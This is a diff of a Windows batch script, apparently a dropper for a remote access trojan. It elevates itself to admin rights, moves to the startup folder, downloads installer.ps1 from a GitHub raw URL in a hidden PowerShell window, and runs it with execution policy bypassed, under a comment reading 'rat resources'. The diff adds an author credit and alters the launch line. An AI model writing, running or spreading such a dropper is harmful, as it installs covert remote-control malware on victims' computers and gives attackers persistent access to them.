@@ -1,5 +1,7 @@
 REM get admin permissions for script
+REM created by : jfrdgh (@bigmanlc on dc)
 @echo off
+
 :: BatchGotAdmin
 :-------------------------------------
 REM  --> check for permissions
@@ -36,4 +38,4 @@ cd %STARTUP%
 
 REM rat resources
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/jfrdgh/Quention/main/installer.ps1 -OutFile installer.ps1"
-powershell Start-Process -windowstyle hidden -ep bypass -c "installer.ps1"
+powershell powershell.exe -ep bypass -c "./installer.ps1"
